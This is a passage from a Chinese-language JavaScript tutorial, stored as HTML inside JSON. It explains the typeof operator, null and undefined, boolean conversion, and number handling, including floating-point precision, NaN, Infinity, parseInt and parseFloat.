type）的值，因为一个对象往往是多个原始类型的值的合成，可以看作是一个存放各种值的容器。至于<code>undefined</code>和<code>null</code>，一般将它们看成两个特殊值。</p>\n<p>对象是最复杂的数据类型，又可以分成三个子类型。</p>\n<ul>\n<li>狭义的对象（object）</li>\n<li>数组（array）</li>\n<li>函数（function）</li>\n</ul>\n<p>狭义的对象和数组是两种不同的数据组合方式，除非特别声明，本教程的”对象“都特指狭义的对象。函数其实是处理数据的方法，JavaScript 把它当成一种数据类型，可以赋值给变量，这为编程带来了很大的灵活性，也为 JavaScript 的“函数式编程”奠定了基础。</p>\n\n        <h2>\n            <a href='#typeof-运算符' class='header-anchor'>#</a>\n            <span>typeof 运算符</span>\n        </h2>\n    <p>JavaScript 有三种方法，可以确定一个值到底是什么类型。</p>\n<ul>\n<li><code>typeof</code>运算符</li>\n<li><code>instanceof</code>运算符</li>\n<li><code>Object.prototype.toString</code>方法</li>\n</ul>\n<p><code>instanceof</code>运算符和<code>Object.prototype.toString</code>方法，将在后文介绍。这里介绍<code>typeof</code>运算符。</p>\n<p><code>typeof</code>运算符可以返回一个值的数据类型。</p>\n<p>数值、字符串、布尔值分别返回<code>number</code>、<code>string</code>、<code>boolean</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof 123 // &quot;number&quot;\ntypeof &#039;123&#039; // &quot;string&quot;\ntypeof false // &quot;boolean&quot;</code></pre><p>函数返回<code>function</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {}\ntypeof f\n// &quot;function&quot;</code></pre><p><code>undefined</code>返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof undefined\n// &quot;undefined&quot;</code></pre><p>利用这一点，<code>typeof</code>可以用来检查一个没有声明的变量，而不报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>v\n// ReferenceError: v is not defined\n\ntypeof v\n// &quot;undefined&quot;</code></pre><p>上面代码中，变量<code>v</code>没有用<code>var</code>命令声明，直接使用就会报错。但是，放在<code>typeof</code>后面，就不报错了，而是返回<code>undefined</code>。</p>\n<p>实际编程中，这个特点通常用在判断语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 错误的写法\nif (v) {\n  // ...\n}\n// ReferenceError: v is not defined\n\n// 正确的写法\nif (typeof v === &quot;undefined&quot;) {\n  // ...\n}</code></pre><p>对象返回<code>object</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof window // &quot;object&quot;\ntypeof {} // &quot;object&quot;\ntypeof [] // &quot;object&quot;</code></pre><p>上面代码中，空数组（<code>[]</code>）的类型也是<code>object</code>，这表示在 JavaScript 内部，数组本质上只是一种特殊的对象。这里顺便提一下，<code>instanceof</code>运算符可以区分数组和对象。<code>instanceof</code>运算符的详细解释，请见《面向对象编程》一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {};\nvar a = [];\n\no instanceof Array // false\na instanceof Array // true</code></pre><p><code>null</code>返回<code>object</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof null // &quot;object&quot;</code></pre><p><code>null</code>的类型是<code>object</code>，这是由于历史原因造成的。1995年的 JavaScript 语言第一版，只设计了五种数据类型（对象、整数、浮点数、字符串和布尔值），没考虑<code>null</code>，只把它当作<code>object</code>的一种特殊值。后来<code>null</code>独立出来，作为一种单独的数据类型，为了兼容以前的代码，<code>typeof null</code>返回<code>object</code>就没法改变了。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/11/improving-typeof.html\">Improving the JavaScript typeof operator</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"null，undefined和布尔值","link":"/types/null-undefined-boolean.html"}],"content":"\n        <h1>\n            <a href='#null,-undefined-和布尔值' class='header-anchor'>#</a>\n            <span>null, undefined 和布尔值</span>\n        </h1>\n    \n        <h2>\n            <a href='#null-和-undefined' class='header-anchor'>#</a>\n            <span>null 和 undefined</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p><code>null</code>与<code>undefined</code>都可以表示“没有”，含义非常相似。将一个变量赋值为<code>undefined</code>或<code>null</code>，老实说，语法效果几乎没区别。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = undefined;\n// 或者\nvar a = null;</code></pre><p>上面代码中，变量<code>a</code>分别被赋值为<code>undefined</code>和<code>null</code>，这两种写法的效果几乎等价。</p>\n<p>在<code>if</code>语句中，它们都会被自动转为<code>false</code>，相等运算符（<code>==</code>）甚至直接报告两者相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (!undefined) {\n  console.log(&#039;undefined is false&#039;);\n}\n// undefined is false\n\nif (!null) {\n  console.log(&#039;null is false&#039;);\n}\n// null is false\n\nundefined == null\n// true</code></pre><p>从上面代码可见，两者的行为是何等相似！谷歌公司开发的 JavaScript 语言的替代品 Dart 语言，就明确规定只有<code>null</code>，没有<code>undefined</code>！</p>\n<p>既然含义与用法都差不多，为什么要同时设置两个这样的值，这不是无端增加复杂度，令初学者困扰吗？这与历史原因有关。</p>\n<p>1995年 JavaScript 诞生时，最初像 Java 一样，只设置了<code>null</code>表示&quot;无&quot;。根据 C 语言的传统，<code>null</code>可以自动转为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(null) // 0\n5 + null // 5</code></pre><p>上面代码中，<code>null</code>转为数字时，自动变成0。</p>\n<p>但是，JavaScript 的设计者 Brendan Eich，觉得这样做还不够。首先，第一版的 JavaScript 里面，<code>null</code>就像在 Java 里一样，被当成一个对象，Brendan Eich 觉得表示“无”的值最好不是对象。其次，那时的 JavaScript 不包括错误处理机制，Brendan Eich 觉得，如果<code>null</code>自动转为0，很不容易发现错误。</p>\n<p>因此，他又设计了一个<code>undefined</code>。区别是这样的：<code>null</code>是一个表示“空”的对象，转为数值时为<code>0</code>；<code>undefined</code>是一个表示&quot;此处无定义&quot;的原始值，转为数值时为<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(undefined) // NaN\n5 + undefined // NaN</code></pre>\n        <h3>\n            <a href='#用法和含义' class='header-anchor'>#</a>\n            <span>用法和含义</span>\n        </h3>\n    <p>对于<code>null</code>和<code>undefined</code>，大致可以像下面这样理解。</p>\n<p><code>null</code>表示空值，即该处的值现在为空。调用函数时，某个参数未设置任何值，这时就可以传入<code>null</code>，表示该参数为空。比如，某个函数接受引擎抛出的错误作为参数，如果运行过程中未出错，那么这个参数就会传入<code>null</code>，表示未发生错误。</p>\n<p><code>undefined</code>表示“未定义”，下面是返回<code>undefined</code>的典型场景。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 变量声明了，但没有赋值\nvar i;\ni // undefined\n\n// 调用函数时，应该提供的参数没有提供，该参数等于 undefined\nfunction f(x) {\n  return x;\n}\nf() // undefined\n\n// 对象没有赋值的属性\nvar  o = new Object();\no.p // undefined\n\n// 函数没有返回值时，默认返回 undefined\nfunction f() {}\nf() // undefined</code></pre>\n        <h2>\n            <a href='#布尔值' class='header-anchor'>#</a>\n            <span>布尔值</span>\n        </h2>\n    <p>布尔值代表“真”和“假”两个状态。“真”用关键字<code>true</code>表示，“假”用关键字<code>false</code>表示。布尔值只有这两个值。</p>\n<p>下列运算符会返回布尔值：</p>\n<ul>\n<li>两元逻辑运算符： <code>&amp;&amp;</code> (And)，<code>||</code> (Or)</li>\n<li>前置逻辑运算符： <code>!</code> (Not)</li>\n<li>相等运算符：<code>===</code>，<code>!==</code>，<code>==</code>，<code>!=</code></li>\n<li>比较运算符：<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，<code>&lt;=</code></li>\n</ul>\n<p>如果 JavaScript 预期某个位置应该是布尔值，会将该位置上现有的值自动转为布尔值。转换规则是除了下面六个值被转为<code>false</code>，其他值都视为<code>true</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>false</code></li>\n<li><code>0</code></li>\n<li><code>NaN</code></li>\n<li><code>&quot;&quot;</code>或<code>&#39;&#39;</code>（空字符串）</li>\n</ul>\n<p>布尔值往往用于程序流程的控制，请看一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (&#039;&#039;) {\n  console.log(&#039;true&#039;);\n}\n// 没有任何输出</code></pre><p>上面代码中，<code>if</code>命令后面的判断条件，预期应该是一个布尔值，所以 JavaScript 自动将空字符串，转为布尔值<code>false</code>，导致程序不会进入代码块，所以没有任何输出。</p>\n<p>注意，空数组（<code>[]</code>）和空对象（<code>{}</code>）对应的布尔值，都是<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if ([]) {\n  console.log(&#039;true&#039;);\n}\n// true\n\nif ({}) {\n  console.log(&#039;true&#039;);\n}\n// true</code></pre><p>更多关于数据类型转换的介绍，参见《数据类型转换》一章。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/01/categorizing-values.html\">Categorizing values in JavaScript</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"数值","link":"/types/number.html"}],"content":"\n        <h1>\n            <a href='#数值' class='header-anchor'>#</a>\n            <span>数值</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#整数和浮点数' class='header-anchor'>#</a>\n            <span>整数和浮点数</span>\n        </h3>\n    <p>JavaScript 内部，所有数字都是以64位浮点数形式储存，即使整数也是如此。所以，<code>1</code>与<code>1.0</code>是相同的，是同一个数。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 === 1.0 // true</code></pre><p>这就是说，JavaScript 语言的底层根本没有整数，所有数字都是小数（64位浮点数）。容易造成混淆的是，某些运算只有整数才能完成，此时 JavaScript 会自动把64位浮点数，转成32位整数，然后再进行运算，参见《运算符》一章的”位运算“部分。</p>\n<p>由于浮点数不是精确的值，所以涉及小数的比较和运算要特别小心。</p>\n<pre class=\"prettyprint language-javascript\"><code>0.1 + 0.2 === 0.3\n// false\n\n0.3 / 0.1\n// 2.9999999999999996\n\n(0.3 - 0.2) === (0.2 - 0.1)\n// false</code></pre>\n        <h3>\n            <a href='#数值精度' class='header-anchor'>#</a>\n            <span>数值精度</span>\n        </h3>\n    <p>根据国际标准 IEEE 754，JavaScript 浮点数的64个二进制位，从最左边开始，是这样组成的。</p>\n<ul>\n<li>第1位：符号位，<code>0</code>表示正数，<code>1</code>表示负数</li>\n<li>第2位到第12位（共11位）：指数部分</li>\n<li>第13位到第64位（共52位）：小数部分（即有效数字）</li>\n</ul>\n<p>符号位决定了一个数的正负，指数部分决定了数值的大小，小数部分决定了数值的精度。</p>\n<p>指数部分一共有11个二进制位，因此大小范围就是0到2047。IEEE 754 规定，如果指数部分的值在0到2047之间（不含两个端点），那么有效数字的第一位默认总是1，不保存在64位浮点数之中。也就是说，有效数字这时总是<code>1.xx...xx</code>的形式，其中<code>xx..xx</code>的部分保存在64位浮点数之中，最长可能为52位。因此，JavaScript 提供的有效数字最长为53个二进制位。</p>\n<pre class=\"prettyprint\"><code>(-1)^符号位 * 1.xx...xx * 2^指数部分</code></pre><p>上面公式是正常情况下（指数部分在0到2047之间），一个数在 JavaScript 内部实际的表示形式。</p>\n<p>精度最多只能到53个二进制位，这意味着，绝对值小于等于2的53次方的整数，即-2<sup>53</sup>到2<sup>53</sup>，都可以精确表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, 53)\n// 9007199254740992\n\nMath.pow(2, 53) + 1\n// 9007199254740992\n\nMath.pow(2, 53) + 2\n// 9007199254740994\n\nMath.pow(2, 53) + 3\n// 9007199254740996\n\nMath.pow(2, 53) + 4\n// 9007199254740996</code></pre><p>上面代码中，大于2的53次方以后，整数运算的结果开始出现错误。所以，大于2的53次方的数值，都无法保持精度。由于2的53次方是一个16位的十进制数值，所以简单的法则就是，JavaScript 对15位的十进制数都可以精确处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, 53)\n// 9007199254740992\n\n// 多出的三个有效数字，将无法保存\n9007199254740992111\n// 9007199254740992000</code></pre><p>上面示例表明，大于2的53次方以后，多出来的有效数字（最后三位的<code>111</code>）都会无法保存，变成0。</p>\n\n        <h3>\n            <a href='#数值范围' class='header-anchor'>#</a>\n            <span>数值范围</span>\n        </h3>\n    <p>根据标准，64位浮点数的指数部分的长度是11个二进制位，意味着指数部分的最大值是2047（2的11次方减1）。也就是说，64位浮点数的指数部分的值最大为2047，分出一半表示负数，则 JavaScript 能够表示的数值范围为2<sup>1024</sup>到2<sup>-1023</sup>（开区间），超出这个范围的数无法表示。</p>\n<p>如果一个数大于等于2的1024次方，那么就会发生“正向溢出”，即 JavaScript 无法表示这么大的数，这时就会返回<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, 1024) // Infinity</code></pre><p>如果一个数小于等于2的-1075次方（指数部分最小值-1023，再加上小数部分的52位），那么就会发生为“负向溢出”，即 JavaScript 无法表示这么小的数，这时会直接返回0。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.pow(2, -1075) // 0</code></pre><p>下面是一个实际的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 0.5;\n\nfor(var i = 0; i &lt; 25; i++) {\n  x = x * x;\n}\n\nx // 0</code></pre><p>上面代码中，对<code>0.5</code>连续做25次平方，由于最后结果太接近0，超出了可表示的范围，JavaScript 就直接将其转为0。</p>\n<p>JavaScript 提供<code>Number</code>对象的<code>MAX_VALUE</code>和<code>MIN_VALUE</code>属性，返回可以表示的具体的最大值和最小值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.MAX_VALUE // 1.7976931348623157e+308\nNumber.MIN_VALUE // 5e-324</code></pre>\n        <h2>\n            <a href='#数值的表示法' class='header-anchor'>#</a>\n            <span>数值的表示法</span>\n        </h2>\n    <p>JavaScript 的数值有多种表示方法，可以用字面形式直接表示，比如<code>35</code>（十进制）和<code>0xFF</code>（十六进制）。</p>\n<p>数值也可以采用科学计数法表示，下面是几个科学计数法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>123e3 // 123000\n123e-3 // 0.123\n-3.1E+12\n.1e-23</code></pre><p>科学计数法允许字母<code>e</code>或<code>E</code>的后面，跟着一个整数，表示这个数值的指数部分。</p>\n<p>以下两种情况，JavaScript 会自动将数值转为科学计数法表示，其他情况都采用字面形式直接表示。</p>\n<p><strong>（1）小数点前的数字多于21位。</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>1234567890123456789012\n// 1.2345678901234568e+21\n\n123456789012345678901\n// 123456789012345680000</code></pre><p><strong>（2）小数点后的零多于5个。</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>// 小数点后紧跟5个以上的零，\n// 就自动转为科学计数法\n0.0000003 // 3e-7\n\n// 否则，就保持原来的字面形式\n0.000003 // 0.000003</code></pre>\n        <h2>\n            <a href='#数值的进制' class='header-anchor'>#</a>\n            <span>数值的进制</span>\n        </h2>\n    <p>使用字面量（literal）直接表示一个数值时，JavaScript 对整数提供四种进制的表示方法：十进制、十六进制、八进制、二进制。</p>\n<ul>\n<li>十进制：没有前导0的数值。</li>\n<li>八进制：有前缀<code>0o</code>或<code>0O</code>的数值，或者有前导0、且只用到0-7的八个阿拉伯数字的数值。</li>\n<li>十六进制：有前缀<code>0x</code>或<code>0X</code>的数值。</li>\n<li>二进制：有前缀<code>0b</code>或<code>0B</code>的数值。</li>\n</ul>\n<p>默认情况下，JavaScript 内部会自动将八进制、十六进制、二进制转为十进制。下面是一些例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>0xff // 255\n0o377 // 255\n0b11 // 3</code></pre><p>如果八进制、十六进制、二进制的数值里面，出现不属于该进制的数字，就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>0xzz // 报错\n0o88 // 报错\n0b22 // 报错</code></pre><p>上面代码中，十六进制出现了字母<code>z</code>、八进制出现数字<code>8</code>、二进制出现数字<code>2</code>，因此报错。</p>\n<p>通常来说，有前导0的数值会被视为八进制，但是如果前导0后面有数字<code>8</code>和<code>9</code>，则该数值被视为十进制。</p>\n<pre class=\"prettyprint language-javascript\"><code>0888 // 888\n0777 // 511</code></pre><p>前导0表示八进制，处理时很容易造成混乱。ES5 的严格模式和 ES6，已经废除了这种表示法，但是浏览器为了兼容以前的代码，目前还继续支持这种表示法。</p>\n\n        <h2>\n            <a href='#特殊数值' class='header-anchor'>#</a>\n            <span>特殊数值</span>\n        </h2>\n    <p>JavaScript 提供了几个特殊的数值。</p>\n\n        <h3>\n            <a href='#正零和负零' class='header-anchor'>#</a>\n            <span>正零和负零</span>\n        </h3>\n    <p>前面说过，JavaScript 的64位浮点数之中，有一个二进制位是符号位。这意味着，任何一个数都有一个对应的负值，就连<code>0</code>也不例外。</p>\n<p>JavaScript 内部实际上存在2个<code>0</code>：一个是<code>+0</code>，一个是<code>-0</code>，区别就是64位浮点数表示法的符号位不同。它们是等价的。</p>\n<pre class=\"prettyprint language-javascript\"><code>-0 === +0 // true\n0 === -0 // true\n0 === +0 // true</code></pre><p>几乎所有场合，正零和负零都会被当作正常的<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>+0 // 0\n-0 // 0\n(-0).toString() // &#039;0&#039;\n(+0).toString() // &#039;0&#039;</code></pre><p>唯一有区别的场合是，<code>+0</code>或<code>-0</code>当作分母，返回的值是不相等的。</p>\n<pre class=\"prettyprint language-javascript\"><code>(1 / +0) === (1 / -0) // false</code></pre><p>上面的代码之所以出现这样结果，是因为除以正零得到<code>+Infinity</code>，除以负零得到<code>-Infinity</code>，这两者是不相等的（关于<code>Infinity</code>详见下文）。</p>\n\n        <h3>\n            <a href='#NaN' class='header-anchor'>#</a>\n            <span>NaN</span>\n        </h3>\n    <p><strong>（1）含义</strong></p>\n<p><code>NaN</code>是 JavaScript 的特殊值，表示“非数字”（Not a Number），主要出现在将字符串解析成数字出错的场合。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 - &#039;x&#039; // NaN</code></pre><p>上面代码运行时，会自动将字符串<code>x</code>转为数值，但是由于<code>x</code>不是数值，所以最后得到结果为<code>NaN</code>，表示它是“非数字”（<code>NaN</code>）。</p>\n<p>另外，一些数学函数的运算结果会出现<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.acos(2) // NaN\nMath.log(-1) // NaN\nMath.sqrt(-1) // NaN</code></pre><p><code>0</code>除以<code>0</code>也会得到<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 / 0 // NaN</code></pre><p>需要注意的是，<code>NaN</code>不是独立的数据类型，而是一个特殊数值，它的数据类型依然属于<code>Number</code>，使用<code>typeof</code>运算符可以看得很清楚。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof NaN // &#039;number&#039;</code></pre><p><strong>（2）运算规则</strong></p>\n<p><code>NaN</code>不等于任何值，包括它本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>NaN === NaN // false</code></pre><p>数组的<code>indexOf</code>方法内部使用的是严格相等运算符，所以该方法对<code>NaN</code>不成立。</p>\n<pre class=\"prettyprint language-javascript\"><code>[NaN].indexOf(NaN) // -1</code></pre><p><code>NaN</code>在布尔运算时被当作<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Boolean(NaN) // false</code></pre><p><code>NaN</code>与任何数（包括它自己）的运算，得到的都是<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>NaN + 32 // NaN\nNaN - 32 // NaN\nNaN * 32 // NaN\nNaN / 32 // NaN</code></pre>\n        <h3>\n            <a href='#Infinity' class='header-anchor'>#</a>\n            <span>Infinity</span>\n        </h3>\n    <p><strong>（1）含义</strong></p>\n<p><code>Infinity</code>表示“无穷”，用来表示两种场景。一种是一个正的数值太大，或一个负的数值太小，无法表示；另一种是非0数值除以0，得到<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 场景一\nMath.pow(2, 1024)\n// Infinity\n\n// 场景二\n0 / 0 // NaN\n1 / 0 // Infinity</code></pre><p>上面代码中，第一个场景是一个表达式的计算结果太大，超出了能够表示的范围，因此返回<code>Infinity</code>。第二个场景是<code>0</code>除以<code>0</code>会得到<code>NaN</code>，而非0数值除以<code>0</code>，会返回<code>Infinity</code>。</p>\n<p><code>Infinity</code>有正负之分，<code>Infinity</code>表示正的无穷，<code>-Infinity</code>表示负的无穷。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity === -Infinity // false\n\n1 / -0 // -Infinity\n-1 / -0 // Infinity</code></pre><p>上面代码中，非零正数除以<code>-0</code>，会得到<code>-Infinity</code>，负数除以<code>-0</code>，会得到<code>Infinity</code>。</p>\n<p>由于数值正向溢出（overflow）、负向溢出（underflow）和被<code>0</code>除，JavaScript 都不报错，而是返回<code>Infinity</code>，所以单纯的数学运算几乎没有可能抛出错误。</p>\n<p><code>Infinity</code>大于一切数值（除了<code>NaN</code>），<code>-Infinity</code>小于一切数值（除了<code>NaN</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity &gt; 1000 // true\n-Infinity &lt; -1000 // true</code></pre><p><code>Infinity</code>与<code>NaN</code>比较，总是返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity &gt; NaN // false\n-Infinity &gt; NaN // false\n\nInfinity &lt; NaN // false\n-Infinity &lt; NaN // false</code></pre><p><strong>（2）运算规则</strong></p>\n<p><code>Infinity</code>的四则运算，符合无穷的数学计算规则。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 * Infinity // Infinity\n5 - Infinity // -Infinity\nInfinity / 5 // Infinity\n5 / Infinity // 0</code></pre><p>0乘以<code>Infinity</code>，返回<code>NaN</code>；0除以<code>Infinity</code>，返回<code>0</code>；<code>Infinity</code>除以0，返回<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 * Infinity // NaN\n0 / Infinity // 0\nInfinity / 0 // Infinity</code></pre><p><code>Infinity</code>加上或乘以<code>Infinity</code>，返回的还是<code>Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity + Infinity // Infinity\nInfinity * Infinity // Infinity</code></pre><p><code>Infinity</code>减去或除以<code>Infinity</code>，得到<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Infinity - Infinity // NaN\nInfinity / Infinity // NaN</code></pre><p><code>Infinity</code>与<code>null</code>计算时，<code>null</code>会转成0，等同于与<code>0</code>的计算。</p>\n<pre class=\"prettyprint language-javascript\"><code>null * Infinity // NaN\nnull / Infinity // 0\nInfinity / null // Infinity</code></pre><p><code>Infinity</code>与<code>undefined</code>计算，返回的都是<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>undefined + Infinity // NaN\nundefined - Infinity // NaN\nundefined * Infinity // NaN\nundefined / Infinity // NaN\nInfinity / undefined // NaN</code></pre>\n        <h2>\n            <a href='#与数值相关的全局方法' class='header-anchor'>#</a>\n            <span>与数值相关的全局方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#parseInt()' class='header-anchor'>#</a>\n            <span>parseInt()</span>\n        </h3>\n    <p><strong>（1）基本用法</strong></p>\n<p><code>parseInt</code>方法用于将字符串转为整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;123&#039;) // 123</code></pre><p>如果字符串头部有空格，空格会被自动去除。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;   81&#039;) // 81</code></pre><p>如果<code>parseInt</code>的参数不是字符串，则会先转为字符串再转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(1.23) // 1\n// 等同于\nparseInt(&#039;1.23&#039;) // 1</code></pre><p>字符串转为整数的时候，是一个个字符依次转换，如果遇到不能转为数字的字符，就不再进行下去，返回已经转好的部分。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;8a&#039;) // 8\nparseInt(&#039;12**&#039;) // 12\nparseInt(&#039;12.34&#039;) // 12\nparseInt(&#039;15e2&#039;) // 15\nparseInt(&#039;15px&#039;) // 15</code></pre><p>上面代码中，<code>parseInt</code>的参数都是字符串，结果只返回字符串头部可以转为数字的部分。</p>\n<p>如果字符串的第一个字符不能转化为数字（后面跟着数字的正负号除外），返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;abc&#039;) // NaN\nparseInt(&#039;.3&#039;) // NaN\nparseInt(&#039;&#039;) // NaN\nparseInt(&#039;+&#039;) // NaN\nparseInt(&#039;+1&#039;) // 1</code></pre><p>所以，<code>parseInt</code>的返回值只有两种可能，要么是一个十进制整数，要么是<code>NaN</code>。</p>\n<p>如果字符串以<code>0x</code>或<code>0X</code>开头，<code>parseInt</code>会将其按照十六进制数解析。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;0x10&#039;) // 16</code></pre><p>如果字符串以<code>0</code>开头，将其按照10进制解析。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;011&#039;) // 11</code></pre><p>对于那些会自动转为科学计数法的数字，<code>parseInt</code>会将科学计数法的表示方法视为字符串，因此导致一些奇怪的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(1000000000000000000000.5) // 1\n// 等同于\nparseInt(&#039;1e+21&#039;) // 1\n\nparseInt(0.0000008) // 8\n// 等同于\nparseInt(&#039;8e-7&#039;) // 8</code></pre><p><strong>（2）进制转换</strong></p>\n<p><code>parseInt</code>方法还可以接受第二个参数（2到36之间），表示被解析的值的进制，返回该值对应的十进制数。默认情况下，<code>parseInt</code>的第二个参数为10，即默认是十进制转十进制。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;1000&#039;) // 1000\n// 等同于\nparseInt(&#039;1000&#039;, 10) // 1000</code></pre><p>下面是转换指定进制的数的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;1000&#039;, 2) // 8\nparseInt(&#039;1000&#039;, 6) // 216\nparseInt(&#039;1000&#039;, 8) // 512</code></pre><p>上面代码中，二进制、六进制、八进制的<code>1000</code>，分别等于十进制的8、216和512。这意味着，可以用<code>parseInt</code>方法进行进制的转换。</p>\n<p>如果第二个参数不是数值，会被自动转为一个整数。这个整数只有在2到36之间，才能得到有意义的结果，超出这个范围，则返回<code>NaN</code>。如果第二个参数是<code>0</code>、<code>undefined</code>和<code>null</code>，则直接忽略。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;10&#039;, 37) // NaN\nparseInt(&#039;10&#039;, 1) // NaN\nparseInt(&#039;10&#039;, 0) // 10\nparseInt(&#039;10&#039;, null) // 10\nparseInt(&#039;10&#039;, undefined) // 10</code></pre><p>如果字符串包含对于指定进制无意义的字符，则从最高位开始，只返回可以转换的数值。如果最高位无法转换，则直接返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(&#039;1546&#039;, 2) // 1\nparseInt(&#039;546&#039;, 2) // NaN</code></pre><p>上面代码中，对于二进制来说，<code>1</code>是有意义的字符，<code>5</code>、<code>4</code>、<code>6</code>都是无意义的字符，所以第一行返回1，第二行返回<code>NaN</code>。</p>\n<p>前面说过，如果<code>parseInt</code>的第一个参数不是字符串，会被先转为字符串。这会导致一些令人意外的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(0x11, 36) // 43\nparseInt(0x11, 2) // 1\n\n// 等同于\nparseInt(String(0x11), 36)\nparseInt(String(0x11), 2)\n\n// 等同于\nparseInt(&#039;17&#039;, 36)\nparseInt(&#039;17&#039;, 2)</code></pre><p>上面代码中，十六进制的<code>0x11</code>会被先转为十进制的17，再转为字符串。然后，再用36进制或二进制解读字符串<code>17</code>，最后返回结果<code>43</code>和<code>1</code>。</p>\n<p>这种处理方式，对于八进制的前缀0，尤其需要注意。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseInt(011, 2) // NaN\n\n// 等同于\nparseInt(String(011), 2)\n\n// 等同于\nparseInt(String(9), 2)</code></pre><p>上面代码中，第一行的<code>011</code>会被先转为字符串<code>9</code>，因为<code>9</code>不是二进制的有效字符，所以返回<code>NaN</code>。如果直接计算<code>parseInt(&#39;011&#39;, 2)</code>，<code>011</code>则是会被当作二进制处理，返回3。</p>\n<p>JavaScript 不再允许将带有前缀0的数字视为八进制数，而是要求忽略这个<code>0</code>。但是，为了保证兼容性，大部分浏览器并没有部署这一条规定。</p>\n\n        <h3>\n            <a href='#parseFloat()' class='header-anchor'>#</a>\n            <span>parseFloat()</span>\n        </h3>\n    <p><code>parseFloat</code>方法用于将一个字符串转为浮点数。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;3.14&#039;) // 3.14</code></pre><p>如果字符串符合科学计数法，则会进行相应的转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;314e-2&#039;) // 3.14\nparseFloat(&#039;0.0314E+2&#039;) // 3.14</code></pre><p>如果字符串包含不能转为浮点数的字符，则不再进行往后转换，返回已经转好的部分。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;3.14more non-digit characters&#039;) // 3.14</code></pre><p><code>parseFloat</code>方法会自动过滤字符串前导的空格。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(&#039;\\t\\v\\r12.34\\n &#039;) // 